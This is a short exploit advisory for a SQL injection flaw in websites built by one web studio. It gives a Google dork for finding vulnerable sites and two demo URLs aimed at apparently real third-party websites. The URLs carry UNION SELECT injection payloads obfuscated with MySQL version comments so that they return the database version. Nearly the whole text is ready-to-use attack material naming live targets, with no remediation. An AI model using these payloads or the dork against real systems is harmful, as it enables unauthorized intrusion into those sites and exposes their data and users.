    *********************************************************
    #Exploit Title: ariuswebstudio - Sql Injection Vulnerability
    #Date: 2021-07-11
    #Exploit Author: Behrouz Mansoori
    #Google Dork: "site by: www.ariuswebstudio.com"
    #Category:webapps
    #Tested On: windows 10, Firefox


    Proof of Concept:
    Search google Dork: "site by: www.ariuswebstudio.com"


    ### Demo :

    http://lensfedernakulam.com/material.php?id=19%20/*!12345union*/%20/*!12345select*/%201,2,version(),4,5--

    http://munnartourism.org/packagedetails.php?id=-35%27%20/*!12345UNION*/%20SELECT%201,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+

    *********************************************************
    #Discovered by: Behrouz mansoori
    #Instagram: Behrouz_mansoori
    #Email: mr.mansoori@yahoo.com
    #site : www.bmansoori.ir
    *********************************************************